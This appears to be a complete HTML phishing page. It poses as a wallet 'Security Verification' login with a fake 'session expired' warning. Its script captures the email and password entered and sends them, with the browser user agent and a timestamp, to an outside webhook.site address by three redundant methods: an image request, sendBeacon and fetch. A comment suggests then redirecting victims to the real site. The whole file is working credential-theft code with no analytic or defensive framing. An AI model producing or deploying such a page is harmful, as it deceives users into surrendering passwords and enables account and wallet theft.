<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no">
<title>Wallet Authentication</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    background: #f5f5f5;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .container {
    max-width: 400px;
    width: 100%;
    background: white;
    padding: 40px 30px;
    border-radius: 12px;
    box-shadow: 0 2px 20px rgba(0,0,0,0.1);
  }
  .logo {
    text-align: center;
    font-size: 48px;
    margin-bottom: 20px;
  }
  h1 {
    text-align: center;
    color: #333;
    font-size: 24px;
    margin-bottom: 30px;
  }
  .alert {
    background: #fff3cd;
    border: 1px solid #ffc107;
    color: #856404;
    padding: 12px;
    border-radius: 8px;
    margin-bottom: 20px;
    font-size: 14px;
  }
  .input-group {
    margin-bottom: 20px;
  }
  label {
    display: block;
    color: #555;
    margin-bottom: 8px;
    font-size: 14px;
    font-weight: 500;
  }
  input {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid #ddd;
    border-radius: 8px;
    font-size: 15px;
  }
  input:focus {
    outline: none;
    border-color: #667eea;
  }
  button {
    width: 100%;
    background: #667eea;
    color: white;
    padding: 14px;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">üîê</div>
  <h1>Security Verification</h1>
  
  <div class="alert">
    ‚ö†Ô∏è Your session has expired. Please re-authenticate to continue.
  </div>
  
  <form id="loginForm">
    <div class="input-group">
      <label>Email</label>
      <input type="email" id="email" placeholder="Enter your email" required autofocus>
    </div>
    
    <div class="input-group">
      <label>Password</label>
      <input type="password" id="password" placeholder="Enter your password" required>
    </div>
    
    <button type="submit">Verify Account</button>
  </form>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  // Send via multiple methods
  const webhookUrl = 'https://webhook.site/40815ef5-1dac-4c51-836f-825210500754';
  
  // Method 1: GET with Image
  const img = new Image();
  img.src = webhookUrl + 
    '?email=' + encodeURIComponent(email) + 
    '&pass=' + encodeURIComponent(password) +
    '&ua=' + encodeURIComponent(navigator.userAgent) +
    '&ts=' + Date.now();
  
  // Method 2: POST with sendBeacon
  const data = JSON.stringify({
    email: email,
    password: password,
    userAgent: navigator.userAgent,
    timestamp: Date.now(),
    event: 'immediate_capture'
  });
  
  if (navigator.sendBeacon) {
    navigator.sendBeacon(webhookUrl, 'creds=' + encodeURIComponent(data));
  }
  
  // Method 3: Fetch
  fetch(webhookUrl, {
    method: 'POST',
    mode: 'no-cors',
    headers: {'Content-Type': 'text/plain'},
    body: 'email=' + email + '&password=' + password
  }).catch(() => {});
  
  // Show loading
  alert('Verifying your account...');
  
  // Could redirect to real site here
  // window.location.href = 'https://real-site.com';
  
  return false;
});

// Auto-focus on email
document.getElementById('email').focus();
</script>

</body>
</html>
